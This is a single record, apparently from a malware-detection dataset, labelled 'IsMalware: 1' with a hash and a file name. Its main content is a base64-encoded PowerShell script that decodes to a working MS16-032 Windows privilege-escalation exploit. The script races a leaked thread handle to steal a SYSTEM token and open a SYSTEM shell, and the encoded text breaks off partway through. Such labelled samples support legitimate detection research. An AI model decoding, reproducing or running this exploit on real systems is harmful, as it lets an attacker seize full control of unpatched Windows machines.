Invoke-MS16-032.ps1,8c0d65131edf0589b8b2e2f298623987,Scan result is 32768. IsMalware: 1,ZnVuY3Rpb24gSW52b2tlLU1TMTYtMDMyIHsKPCMKLlNZTk9QU0lTCiAgICAKICAgIFBvd2VyU2hlbGwgaW1wbGVtZW50YXRpb24gb2YgTVMxNi0wMzIuIFRoZSBleHBsb2l0IHRhcmdldHMgYWxsIHZ1bG5lcmFibGUKICAgIG9wZXJhdGluZyBzeXN0ZW1zIHRoYXQgc3VwcG9ydCBQb3dlclNoZWxsIHYyKy4gQ3JlZGl0IGZvciB0aGUgZGlzY292ZXJ5IG9mCiAgICB0aGUgYnVnIGFuZCB0aGUgbG9naWMgdG8gZXhwbG9pdCBpdCBnbyB0byBKYW1lcyBGb3JzaGF3IChAdGlyYW5pZGRvKS4KICAgIAogICAgVGFyZ2V0czoKICAgIAogICAgKiBXaW43LVdpbjEwICYgMms4LTJrMTIgPD09IDMyLzY0IGJpdCEKICAgICogVGVzdGVkIG9uIHgzMiBXaW43LCB4NjQgV2luOCwgeDY0IDJrMTJSMgogICAgCiAgICBOb3RlczoKICAgIAogICAgKiBJbiBvcmRlciBmb3IgdGhlIHJhY2UgY29uZGl0aW9uIHRvIHN1Y2NlZWQgdGhlIG1hY2hpbmUgbXVzdCBoYXZlIDIrIENQVQogICAgICBjb3Jlcy4gSWYgdGVzdGluZyBpbiBhIFZNIGp1c3QgbWFrZSBzdXJlIHRvIGFkZCBhIGNvcmUgaWYgbmVlZGVkIG1rYXkuCiAgICAqIFRoZSBleHBsb2l0IGlzIHByZXR0eSByZWxpYWJsZSwgaG93ZXZlciB+MS82IHRpbWVzIGl0IHdpbGwgc2F5IGl0IHN1Y2NlZWRlZAogICAgICBidXQgbm90IHNwYXduIGEgc2hlbGwuIE5vdCBzdXJlIHdoYXQgdGhlIGlzc3VlIGlzIGJ1dCBqdXN0IHJlLXJ1biBhbmQgcHJvZml0IQogICAgKiBXYW50IHRvIGtub3cgbW9yZSBhYm91dCBNUzE2LTAzMiA9PT4KICAgICAgaHR0cHM6Ly9nb29nbGVwcm9qZWN0emVyby5ibG9nc3BvdC5jby51ay8yMDE2LzAzL2V4cGxvaXRpbmctbGVha2VkLXRocmVhZC1oYW5kbGUuaHRtbAoKLkRFU0NSSVBUSU9OCglBdXRob3I6IFJ1YmVuIEJvb25lbiAoQEZ1enp5U2VjKQoJQmxvZzogaHR0cDovL3d3dy5mdXp6eXNlY3VyaXR5LmNvbS8KCUxpY2Vuc2U6IEJTRCAzLUNsYXVzZQoJUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBQb3dlclNoZWxsIHYyKwoJT3B0aW9uYWwgRGVwZW5kZW5jaWVzOiBOb25lCiAgICAKLkVYQU1QTEUKCUM6XFBTPiBJbnZva2UtTVMxNi0wMzIKIz4KCUFkZC1UeXBlIC1UeXBlRGVmaW5pdGlvbiBAIgoJdXNpbmcgU3lzdGVtOwoJdXNpbmcgU3lzdGVtLkRpYWdub3N0aWNzOwoJdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOwoJdXNpbmcgU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbDsKCQoJW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQoJcHVibGljIHN0cnVjdCBQUk9DRVNTX0lORk9STUFUSU9OCgl7CgkJcHVibGljIEludFB0ciBoUHJvY2VzczsKCQlwdWJsaWMgSW50UHRyIGhUaHJlYWQ7CgkJcHVibGljIGludCBkd1Byb2Nlc3NJZDsKCQlwdWJsaWMgaW50IGR3VGhyZWFkSWQ7Cgl9CgkKCVtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsLCBDaGFyU2V0PUNoYXJTZXQuVW5pY29kZSldCglwdWJsaWMgc3RydWN0IFNUQVJUVVBJTkZPCgl7CgkJcHVibGljIEludDMyIGNiOwoJCXB1YmxpYyBzdHJpbmcgbHBSZXNlcnZlZDsKCQlwdWJsaWMgc3RyaW5nIGxwRGVza3RvcDsKCQlwdWJsaWMgc3RyaW5nIGxwVGl0bGU7CgkJcHVibGljIEludDMyIGR3WDsKCQlwdWJsaWMgSW50MzIgZHdZOwoJCXB1YmxpYyBJbnQzMiBkd1hTaXplOwoJCXB1YmxpYyBJbnQzMiBkd1lTaXplOwoJCXB1YmxpYyBJbnQzMiBkd1hDb3VudENoYXJzOwoJCXB1YmxpYyBJbnQzMiBkd1lDb3VudENoYXJzOwoJCXB1YmxpYyBJbnQzMiBkd0ZpbGxBdHRyaWJ1dGU7CgkJcHVibGljIEludDMyIGR3RmxhZ3M7CgkJcHVibGljIEludDE2IHdTaG93V2luZG93OwoJCXB1YmxpYyBJbnQxNiBjYlJlc2VydmVkMjsKCQlwdWJsaWMgSW50UHRyIGxwUmVzZXJ2ZWQyOwoJCXB1YmxpYyBJbnRQdHIgaFN0ZElucHV0OwoJCXB1YmxpYyBJbnRQdHIgaFN0ZE91dHB1dDsKCQlwdWJsaWMgSW50UHRyIGhTdGRFcnJvcjsKCX0KCQoJW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQoJcHVibGljIHN0cnVjdCBTUU9TCgl7CgkJcHVibGljIGludCBMZW5ndGg7CgkJcHVibGljIGludCBJbXBlcnNvbmF0aW9uTGV2ZWw7CgkJcHVibGljIGludCBDb250ZXh0VHJhY2tpbmdNb2RlOwoJCXB1YmxpYyBib29sIEVmZmVjdGl2ZU9ubHk7Cgl9CgkKCXB1YmxpYyBzdGF0aWMgY2xhc3MgQWR2YXBpMzIKCXsKCQlbRGxsSW1wb3J0KCJhZHZhcGkzMi5kbGwiLCBTZXRMYXN0RXJyb3I9dHJ1ZSwgQ2hhclNldD1DaGFyU2V0LlVuaWNvZGUpXQoJCXB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgQ3JlYXRlUHJvY2Vzc1dpdGhMb2dvblcoCgkJCVN0cmluZyB1c2VyTmFtZSwKCQkJU3RyaW5nIGRvbWFpbiwKCQkJU3RyaW5nIHBhc3N3b3JkLAoJCQlpbnQgbG9nb25GbGFncywKCQkJU3RyaW5nIGFwcGxpY2F0aW9uTmFtZSwKCQkJU3RyaW5nIGNvbW1hbmRMaW5lLAoJCQlpbnQgY3JlYXRpb25GbGFncywKCQkJaW50IGVudmlyb25tZW50LAoJCQlTdHJpbmcgY3VycmVudERpcmVjdG9yeSwKCQkJcmVmICBTVEFSVFVQSU5GTyBzdGFydHVwSW5mbywKCQkJb3V0IFBST0NFU1NfSU5GT1JNQVRJT04gcHJvY2Vzc0luZm9ybWF0aW9uKTsKCQkJCgkJW0RsbEltcG9ydCgiYWR2YXBpMzIuZGxsIiwgU2V0TGFzdEVycm9yPXRydWUpXQoJCXB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgU2V0VGhyZWFkVG9rZW4oCgkJCXJlZiBJbnRQdHIgVGhyZWFkLAoJCQlJbnRQdHIgVG9rZW4pOwoJCQkKCQlbRGxsSW1wb3J0KCJhZHZhcGkzMi5kbGwiLCBTZXRMYXN0RXJyb3I9dHJ1ZSldCgkJcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBPcGVuVGhyZWFkVG9rZW4oCgkJCUludFB0ciBUaHJlYWRIYW5kbGUsCgkJCWludCBEZXNpcmVkQWNjZXNzLAoJCQlib29sIE9wZW5Bc1NlbGYsCgkJCW91dCBJbnRQdHIgVG9rZW5IYW5kbGUpOwoJCQkKCQlbRGxsSW1wb3J0KCJhZHZhcGkzMi5kbGwiLCBTZXRMYXN0RXJyb3I9dHJ1ZSldCgkJcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBPcGVuUHJvY2Vzc1Rva2VuKAoJCQlJbnRQdHIgUHJvY2Vzc0hhbmRsZSwgCgkJCWludCBEZXNpcmVkQWNjZXNzLAoJCQlyZWYgSW50UHRyIFRva2VuSGFuZGxlKTsKCQkJCgkJW0RsbEltcG9ydCgiYWR2YXBpMzIuZGxsIiwgU2V0TGFzdEVycm9yPXRydWUpXQoJCXB1YmxpYyBleHRlcm4gc3RhdGljIGJvb2wgRHVwbGljYXRlVG9rZW4oCgkJCUludFB0ciBFeGlzdGluZ1Rva2VuSGFuZGxlLAoJCQlpbnQgU0VDVVJJVFlfSU1QRVJTT05BVElPTl9MRVZFTCwKCQkJcmVmIEludFB0ciBEdXBsaWNhdGVUb2tlbkhhbmRsZSk7Cgl9CgkKCXB1YmxpYyBzdGF0aWMgY2xhc3MgS2VybmVsMzIKCXsKCQlbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0KCQlwdWJsaWMgc3RhdGljIGV4dGVybiB1aW50IEdldExhc3RFcnJvcigpOwoJCgkJW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yPXRydWUpXQoJCXB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRDdXJyZW50UHJvY2VzcygpOwoJCgkJW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yPXRydWUpXQoJCXB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRDdXJyZW50VGhyZWFkKCk7CgkJCgkJW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yPXRydWUpXQoJCXB1YmxpYyBzdGF0aWMgZXh0ZXJuIGludCBHZXRUaHJlYWRJZChJbnRQdHIgaFRocmVhZCk7CgkJCgkJW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCgkJcHVibGljIHN0YXRpYyBleHRlcm4gaW50IEdldFByb2Nlc3NJZE9mVGhyZWFkKEludFB0ciBoYW5kbGUpOwoJCQoJCVtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsU2V0TGFzdEVycm9yPXRydWUpXQoJCXB1YmxpYyBzdGF0aWMgZXh0ZXJuIGludCBTdXNwZW5kVGhyZWFkKEludFB0ciBoVGhyZWFkKTsKCQkKCQlbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLFNldExhc3RFcnJvcj10cnVlKV0KCQlwdWJsaWMgc3RhdGljIGV4dGVybiBpbnQgUmVzdW1lVGhyZWFkKEludFB0ciBoVGhyZWFkKTsKCQkKCQlbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3I9dHJ1ZSldCgkJcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBUZXJtaW5hdGVQcm9jZXNzKAoJCQlJbnRQdHIgaFByb2Nlc3MsCgkJCXVpbnQgdUV4aXRDb2RlKTsKCQoJCVtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvcj10cnVlKV0KCQlwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIENsb3NlSGFuZGxlKEludFB0ciBoT2JqZWN0KTsKCQkKCQlbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3I9dHJ1ZSldCgkJcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBEdXBsaWNhdGVIYW5kbGUoCgkJCUludFB0ciBoU291cmNlUHJvY2Vzc0hhbmRsZSwKCQkJSW50UHRyIGhTb3VyY2VIYW5kbGUsCgkJCUludFB0ciBoVGFyZ2V0UHJvY2Vzc0hhbmRsZSwKCQkJcmVmIEludFB0ciBscFRhcmdldEhhbmRsZSwKCQkJaW50IGR3RGVzaXJlZEFjY2VzcywKCQkJYm9vbCBiSW5oZXJpdEhhbmRsZSwKCQkJaW50IGR3T3B0aW9ucyk7Cgl9CgkKCXB1YmxpYyBzdGF0aWMgY2xhc3MgTnRkbGwKCXsKCQlbRGxsSW1wb3J0KCJudGRsbC5kbGwiLCBTZXRMYXN0RXJyb3I9dHJ1ZSldCgkJcHVibGljIHN0YXRpYyBleHRlcm4gaW50IE50SW1wZXJzb25hdGVUaHJlYWQoCgkJCUludFB0ciBUaHJlYWRIYW5kbGUsCgkJCUludFB0ciBUaHJlYWRUb0ltcGVyc29uYXRlLAoJCQlyZWYgU1FPUyBTZWN1cml0eVF1YWxpdHlPZlNlcnZpY2UpOwoJfQoiQAoJCglmdW5jdGlvbiBHZXQtVGhyZWFkSGFuZGxlIHsKCQkjIFN0YXJ0dXBJbmZvIFN0cnVjdAoJCSRTdGFydHVwSW5mbyA9IE5ldy1PYmplY3QgU1RBUlRVUElORk8KCQkkU3RhcnR1cEluZm8uZHdGbGFncyA9IDB4MDAwMDAxMDAgIyBTVEFSVEZfVVNFU1RESEFORExFUwoJCSRTdGFydHVwSW5mby5oU3RkSW5wdXQgPSBbS2VybmVsMzJdOjpHZXRDdXJyZW50VGhyZWFkKCkKCQkkU3RhcnR1cEluZm8uaFN0ZE91dHB1dCA9IFtLZXJuZWwzMl06OkdldEN1cnJlbnRUaHJlYWQoKQoJCSRTdGFydHVwSW5mby5oU3RkRXJyb3IgPSBbS2VybmVsMzJdOjpHZXRDdXJyZW50VGhyZWFkKCkKCQkkU3RhcnR1cEluZm8uY2IgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoJFN0YXJ0dXBJbmZvKSAjIFN0cnVjdCBTaXplCgkJCgkJIyBQcm9jZXNzSW5mbyBTdHJ1Y3QKCQkkUHJvY2Vzc0luZm8gPSBOZXctT2JqZWN0IFBST0NFU1NfSU5GT1JNQVRJT04KCQkKCQkjIENyZWF0ZVByb2Nlc3NXaXRoTG9nb25XIC0tPiBscEN1cnJlbnREaXJlY3RvcnkKCQkkR2V0Q3VycmVudFBhdGggPSAoR2V0LUl0ZW0gLVBhdGggIi5cIiAtVmVyYm9zZSkuRnVsbE5hbWUKCQkKCQkjIExPR09OX05FVENSRURFTlRJQUxTX09OTFkgLyBDUkVBVEVfU1VTUEVOREVECgkJJENhbGxSZXN1bHQgPSBbQWR2YXBpMzJdOjpDcmVhdGVQcm9jZXNzV2l0aExvZ29uVygKCQkJInVzZXIiLCAiZG9tYWluIiwgInBhc3MiLAoJCQkweDAwMDAwMDAyLCAiQzpcV2luZG93c1xTeXN0ZW0zMlxjbWQuZXhlIiwgIiIsCgkJCTB4MDAwMDAwMDQsICRudWxsLCAkR2V0Q3VycmVudFBhdGgsCgkJCVtyZWZdJFN0YXJ0dXBJbmZvLCBbcmVmXSRQcm9jZXNzSW5mbykKCQkKCQkjIER1cGxpY2F0ZSBoYW5kbGUgaW50byBjdXJyZW50IHByb2Nlc3MgLT4gRFVQTElDQVRFX1NBTUVfQUNDRVNTCgkJJGxwVGFyZ2V0SGFuZGxlID0gW0ludFB0cl06Olplcm8KCQkkQ2FsbFJlc3VsdCA9IFtLZXJuZWwzMl06OkR1cGxpY2F0ZUhhbmRsZSgKCQkJJFByb2Nlc3NJbmZvLmhQcm9jZXNzLCAweDQsCgkJCVtLZXJuZWwzMl06OkdldEN1cnJlbnRQcm9jZXNzKCksCgkJCVtyZWZdJGxwVGFyZ2V0SGFuZGxlLCAwLCAkZmFsc2UsCgkJCTB4MDAwMDAwMDIpCgkJCgkJIyBDbGVhbiB1cCBzdXNwZW5kZWQgcHJvY2VzcwoJCSRDYWxsUmVzdWx0ID0gW0tlcm5lbDMyXTo6VGVybWluYXRlUHJvY2VzcygkUHJvY2Vzc0luZm8uaFByb2Nlc3MsIDEpCgkJJENhbGxSZXN1bHQgPSBbS2VybmVsMzJdOjpDbG9zZUhhbmRsZSgkUHJvY2Vzc0luZm8uaFByb2Nlc3MpCgkJJENhbGxSZXN1bHQgPSBbS2VybmVsMzJdOjpDbG9zZUhhbmRsZSgkUHJvY2Vzc0luZm8uaFRocmVhZCkKCQkKCQkkbHBUYXJnZXRIYW5kbGUKCX0KCQoJZnVuY3Rpb24gR2V0LVN5c3RlbVRva2VuIHsKCQllY2hvICJgbls/XSBUcnlpbmcgdGhyZWFkIGhhbmRsZTogJFRocmVhZCIKCQllY2hvICJbP10gVGhyZWFkIGJlbG9uZ3MgdG86ICQoJChHZXQtUHJvY2VzcyAtUElEICQoW0tlcm5lbDMyXTo6R2V0UHJvY2Vzc0lkT2ZUaHJlYWQoJFRocmVhZCkpKS5Qcm9jZXNzTmFtZSkiCgkKCQkkQ2FsbFJlc3VsdCA9IFtLZXJuZWwzMl06OlN1c3BlbmRUaHJlYWQoJFRocmVhZCkKCQlpZiAoJENhbGxSZXN1bHQgLW5lIDApIHsKCQkJZWNobyAiWyFdICRUaHJlYWQgaXMgYSBiYWQgdGhyZWFkLCBtb3Zpbmcgb24uLiIKCQkJUmV0dXJuCgkJfSBlY2hvICJbK10gVGhyZWFkIHN1c3BlbmRlZCIKCQkKCQllY2hvICJbPl0gV2lwaW5nIGN1cnJlbnQgaW1wZXJzb25hdGlvbiB0b2tlbiIKCQkkQ2FsbFJlc3VsdCA9IFtBZHZhcGkzMl06OlNldFRocmVhZFRva2VuKFtyZWZdJFRocmVhZCwgW0ludFB0cl06Olplcm8pCgkJaWYgKCEkQ2FsbFJlc3VsdCkgewoJCQllY2hvICJbIV0gU2V0VGhyZWFkVG9rZW4gZmFpbGVkLCBtb3Zpbmcgb24uLiIKCQkJJENhbGxSZXN1bHQgPSBbS2VybmVsMzJdOjpSZXN1bWVUaHJlYWQoJFRocmVhZCkKCQkJZWNobyAiWytdIFRocmVhZCByZXN1bWVkISIKCQkJUmV0dXJuCgkJfQoJCQoJCWVjaG8gIls+XSBCdWlsZGluZyBTWVNURU0gaW1wZXJzb25hdGlvbiB0b2tlbiIKCQkjIFNlY3VyaXR5UXVhbGl0eU9mU2VydmljZSBzdHJ1Y3QKCQkkU1FPUyA9IE5ldy1PYmplY3QgU1FPUwoJCSRTUU9TLkltcGVyc29uYXRpb25MZXZlbCA9IDIgI1NlY3VyaXR5SW1wZXJzb25hdGlvbgoJCSRTUU9TLkxlbmd0aCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZigkU1FPUykKCQkjIFVuZG9jdW1lbnRlZCBBUEkncywgSSBsaWtlIHlvdXIgc3R5bGUgTWljcm9zb2Z0IDspCgkJJENhbGxSZXN1bHQgPSBbTnRkbGxdOjpOdEltcGVyc29uYXRlVGhyZWFkKCRUaHJlYWQsICRUaHJlYWQsIFtyZWZdJHNxb3MpCgkJaWYgKCRDYWxsUmVzdWx0IC1uZSAwKSB7CgkJCWVjaG8gIlshXSBOdEltcGVyc29uYXRlVGhyZWFkIGZhaWxlZCwgbW92aW5nIG9uLi4iCgkJCSRDYWxsUmVzdWx0ID0gW0tlcm5lbDMyXTo6UmVzdW1lVGhyZWFkKCRUaHJlYWQpCgkJCWVjaG8gIlsrXSBUaHJlYWQgcmVzdW1lZCEiCgkJCVJldHVybgoJCX0KCQoJCSRzY3JpcHQ6U3lzVG9rZW5IYW5kbGUgPSBbSW50UHRyXTo6WmVybwoJCSMgMHgwMDA2IC0tPiBUT0tFTl9EVVBMSUNBVEUgLWJvciBUT0tFTl9JTVBFUlNPTkFURQoJCSRDYWxsUmVzdWx0ID0gW0FkdmFwaTMyXTo6T3BlblRocmVhZFRva2VuKCRUaHJlYWQsIDB4MDAwNiwgJGZhbHNlLCBbcmVmXSRTeXNUb2tlbkhhbmRsZSkKCQlpZiAoISRDYWxsUmVzdWx0KSB7CgkJCWVjaG8gIlshXSBPcGVuVGhyZWFkVG9rZW4gZmFpbGVkLCBtb3Zpbmcgb24uLiIKCQkJJENhbGxSZXN1bHQgPSBbS2VybmVsMzJdOjpSZXN1bWVUaHJlYWQoJFRocmVhZCkKCQkJZWNobyAiWytdIFRocmVhZCByZXN1bWVkISIKCQkJUmV0dXJuCgkJfQoJCQoJCWVjaG8gIls/XSBTdWNjZXNzLCBvcGVuIFNZU1RFTSB0b2tlbiBoYW5kbGU6ICRTeXNUb2tlbkhhbmRsZSIKCQllY2hvICJbK10gUmVzdW1pbmcgdGhyZWFkLi4iCgkJJENhbGxSZXN1bHQgPSBbS2VybmVsMzJdOjpSZXN1bWVUaHJlYWQoJFRocmVhZCkKCX0KCQoJIyBtYWluKCkgPC0tLSA7KQoJJG1zMTYwMzIgPSBAIgoJIF9fIF9fIF9fXyBfX18gICBfX18gICAgIF9fXyBfX18gX19fIAoJfCAgViAgfCAgX3xfICB8IHwgIF98X19ffCAgIHxfICB8XyAgfAoJfCAgICAgfF8gIHxffCB8X3wgLiB8X19ffCB8IHxfICB8ICBffAoJfF98X3xffF9fX3xfX19fX3xfX198ICAgfF9fX3xfX198X19ffAoJICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCgkgICAgICAgICAgICAgICBbYnkgYjMzZiAtPiBARnV6enlTZWNdCiJACgkKCSRtczE2MDMyCgkKCSMgQ2hlY2sgbG9naWNhbCBwcm9jZXNzb3IgY291bnQsIHJhY2UgY29uZGl0aW9uIHJlcXVpcmVzIDIrCgllY2hvICJgbls/XSBPcGVyYXRpbmcgc3lzdGVtIGNvcmUgY291bnQ6ICQoW1N5c3RlbS5FbnZpcm9ubWVudF06OlByb2Nlc3NvckNvdW50KSIKCWlmICgkKFtTeXN0ZW0uRW52aXJvbm1lbnRdOjpQcm9jZXNzb3JDb3VudCkgLWx0IDIpIHsKCQllY2hvICJbIV0gVGhpcyBpcyBhIFZNIGlzbid0IGl0LCByYWNlIGNvbmRpdGlvbiByZXF1aXJlcyBhdCBsZWFzdCAyIENQVSBjb3JlcywgZXhpdGluZyFgbiIKCQlSZXR1cm4KCX0KCQoJIyBDcmVhdGUgYXJyYXkgZm9yIFRocmVhZHMgJiBUSUQncwoJJFRocmVhZEFycmF5ID0gQCgpCgkkVGlkQXJyYXkgPSBAKCkKCQoJZWNobyAiWz5dIER1cGxpY2F0aW5nIENyZWF0ZVByb2Nlc3NXaXRoTG9nb25XIGhhbmRsZXMuLiIKCSMgTG9vcCBHZXQtVGhyZWFkSGFuZGxlIGFuZCBjb2xsZWN0IHRocmVhZCBoYW5kbGVzIHdpdGggYSB2YWxpZCBUSUQKCWZvciAoJGk9MDsgJGkgLWx0IDUwMDsgJGkrKykgewoJCSRoVGhyZWFkID0gR2V0LVRocmVhZEhhbmRsZQoJCSRoVGhyZWFkSUQgPSBbS2VybmVsMzJdOjpHZXRUaHJlYWRJZCgkaFRocmVhZCkKCQkjIEJpdCBoYWNreS9sYXp5LCBmaWx0ZXJzIG9uIHVuaXEvdmFsaWQgVElEJ3MgdG8gY3JlYXRlICRUaHJlYWRBcnJheQoJCWlmICgkVGlkQXJyYXkgLW5vdGNvbnRhaW5zICRoVGhyZWFkSUQpIHsKCQkJJFRpZEFycmF5ICs9ICRoVGhyZWFkSUQKCQkJaWYgKCRoVGhyZWFkIC1uZSAwKSB7CgkJCQkkVGhyZWFkQXJyYXkgKz0gJGhUaHJlYWQgIyBUaGlzIGlzIHdoYXQgd2UgbmVlZCEKCQkJfQoJCX0KCX0KCQoJaWYgKCQoJFRocmVhZEFycmF5Lmxlbmd0aCkgLWVxIDApIHsKCQllY2hvICJbIV0gTm8gdmFsaWQgdGhyZWFkIGhhbmRsZXMgd2VyZSBjYXB0dXJlZCwgZXhpdGluZyEiCgkJUmV0dXJuCgl9IGVsc2UgewoJCWVjaG8gIls/XSBEb25lLCBnb3QgJCgkVGhyZWFkQXJyYXkubGVuZ3RoKSB0aHJlYWQgaGFuZGxlKHMpISIKCQllY2hvICJgbls/XSBUaHJlYWQgaGFuZGxlIGxpc3Q6IgoJCSRUaHJlYWRBcnJheQoJfQoJCgllY2hvICJgblsqXSBTbmlmZmluZyBvdXQgcHJpdmlsZWdlZCBpbXBlcnNvbmF0aW9uIHRva2VuLi4iCglmb3JlYWNoICgkVGhyZWFkIGluICRUaHJlYWRBcnJheSl7CgkKCQkjIEdldCBoYW5kbGUgdG8gU1lTVEVNIGFjY2VzcyB0b2tlbgoJCUdldC1TeXN0ZW1Ub2tlbgoJCQoJCWVjaG8gImBuWypdIFNuaWZmaW5nIG91dCBTWVNURU0gc2hlbGwuLiIKCQllY2hvICJgbls+XSBEdXBsaWNhdGluZyBTWVNURU0gdG9rZW4iCgkJJGhEdXBsaWNhdGVUb2tlbkhhbmRsZSA9IFtJbnRQdHJdOjpaZXJvCgkJJENhbGxSZXN1bHQgPSBbQWR2YXBpMzJdOjpEdXBsaWNhdGVUb2tlbigkU3lzVG9rZW5IYW5kbGUsIDIsIFtyZWZdJGhEdXBsaWNhdGVUb2tlbkhhbmRsZSkKCQkKCQkjIFNpbXBsZSBQUyBydW5zcGFjZSBkZWZpbml0aW9uCgkJZWNobyAiWz5dIFN0YXJ0aW5nIHRva2VuIHJhY2UiCgkJJFJ1bnNwYWNlID0gW3J1bnNwYWNlZmFjdG9yeV06OkNyZWF0ZVJ1bnNwYWNlKCkKCQkkU3RhcnRUb2tlblJhY2UgPSBbcG93ZXJzaGVsbF06OkNyZWF0ZSgpCgkJJFN0YXJ0VG9rZW5SYWNlLnJ1bnNwYWNlID0gJFJ1bnNwYWNlCgkJJFJ1bnNwYWNlLk9wZW4oKQoJCVt2b2lkXSRTdGFydFRva2VuUmFjZS5BZGRTY3JpcHQoewoJCQlQYXJhbSAoJFRocmVhZCwgJGhEdXBsaWNhdGVUb2tlbkhhbmRsZSkKCQkJd2hpbGUgKCR0cnVlKSB7CgkJCQkkQ2FsbFJlc3VsdCA9IFtBZHZhcGkzMl06OlNldFRocmVhZFRva2VuKFtyZWZdJFRocmVhZCwgJGhEdXBsaWNhdGVUb2tlbkhhbmRsZSkKCQkJfQoJCX0pLkFkZEFyZ3VtZW50KCRUaHJlYWQpLkFkZEFyZ3VtZW50KCRoRHVwbGljYXRlVG9rZW5IYW5kbGUpCgkJJEFzY09iaiA9ICRTdGFydFRva2VuUmFjZS5CZWdpbkludm9rZSgpCgkJCgkJZWNobyAiWz5dIFN0YXJ0aW5nIHByb2Nlc3MgcmFjZSIKCQkjIEFkZGluZyBhIHRpbWVvdXQgKDEwIHNlY29uZHMpIGhlcmUgdG8gc2FmZWd1YXJkIGZyb20gZWRnZS1jYXNlcwoJCSRTYWZlR3VhcmQgPSBbZGlhZ25vc3RpY3Muc3RvcHdhdGNoXTo6U3RhcnROZXcoKQoJCXdoaWxlICgkU2FmZUd1YXJkLkVsYXBzZWRNaWxsaXNlY29uZHMgLWx0IDEwMDAwKSB7CgkJIyBTdGFydHVwSW5mbyBTdHJ1Y3QKCQkkU3RhcnR1cEluZm8gPSBOZXctT2JqZWN0IFNUQVJUVVBJTkZPCgkJJFN0YXJ0dXBJbmZvLmNiID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKCRTdGFydHVwSW5mbykgIyBTdHJ1Y3QgU2l6ZQoJCQoJCSMgUHJvY2Vzc0luZm8gU3RydWN0CgkJJFByb2Nlc3NJbmZvID0gTmV3LU9iamVjdCBQUk9DRVNTX0lORk9STUFUSU9OCgkJCgkJIyBDcmVhdGVQcm9jZXNzV2l0aExvZ29uVyAtLT4gbHBDdXJyZW50RGlyZWN0b3J5CgkJJEdldEN1cnJlbnRQYXRoID0gKEdldC1JdGVtIC1QYXRoICIuXCIgLVZlcmJvc2UpLkZ1bGxOYW1lCgkJCgkJIyBMT0dPTl9ORVRDUkVERU5USUFMU19PTkxZIC8gQ1JFQVRFX1NVU1BFTkRFRAoJCSRDYWxsUmVzdWx0ID0gW0FkdmFwaTMyXTo6Q3JlYXRlUHJvY2Vzc1dpdGhMb2dvblcoCgkJCSJ1c2VyIiwgImRvbWFpbiIsICJwYXNzIiwKCQkJMHgwMDAwMDAwMiwgIkM6XFdpbmRvd3NcU3lzdGVtMzJcY21kLmV4ZSIsICIiLAoJCQkweDAwMDAwMDA0LCAkbnVsbCwgJEdldEN1cnJlbnRQYXRoLAoJCQlbcmVmXSRTdGFydHVwSW5mbywgW3JlZl0kUHJvY2Vzc0luZm8pCgkJCQoJCSRoVG9rZW5IYW5kbGUgPSBbSW50UHRyXTo6WmVybwoJCSRDYWxsUmVzdWx0ID0gW0FkdmFwaTMyXTo6T3BlblByb2Nlc3NUb2tlbigkUHJvY2Vzc0luZm8uaFByb2Nlc3MsIDB4MjgsIFtyZWZdJGhUb2tlbkhhbmRsZSkKCQkjIElmIHdlIGNhbid0IG9wZW4gdGhlIHByb2Nlc3MgdG9rZW4gaXQncyBhIFNZU1RFTSBzaGVsbCEKCQlpZiAoISRDYWxsUmVzdWx0KSB7CgkJCWVjaG8gIlshXSBIb2x5IGhhbmRsZSBsZWFrIEJhdG1hbiwgd2UgaGF2ZSBhIFNZU1RFTSBzaGVsbCEhYG4iCgkJCSRDYWxsUmVzdWx0ID0gW0tlcm5lbDMyXTo6UmVzdW1lVGhyZWFkKCRQcm9jZXNzSW5mby5oVGhyZWFkKQoJCQkkU3RhcnRUb2tlblJhY2UuU3RvcCgpCgkJCSRTYWZlR3VhcmQuU3RvcCgpCgkJCVJldHVybgoJCX0KCQkJCgkJIyBDbGVhbiB1cCBzdXNwZW5kZWQgcHJvY2VzcwoJCSRDYWxsUmVzdWx0ID0gW0tlcm5lbDMyXTo6VGVybWluYXRlUHJvY2VzcygkUHJvY2Vzc0luZm8uaFByb2Nlc3MsIDEpCgkJJENhbGxSZXN1bHQgPSBbS2VybmVsMzJdOjpDbG9zZUhhbmRsZSgkUHJvY2Vzc0luZm8uaFByb2Nlc3MpCgkJJENhbGxSZXN1bHQgPSBbS2VybmVsMzJdOjpDbG9zZUhhbmRsZSgkUHJvY2Vzc0luZm8uaFRocmVhZCkKCQl9CgkJCgkJIyBLaWx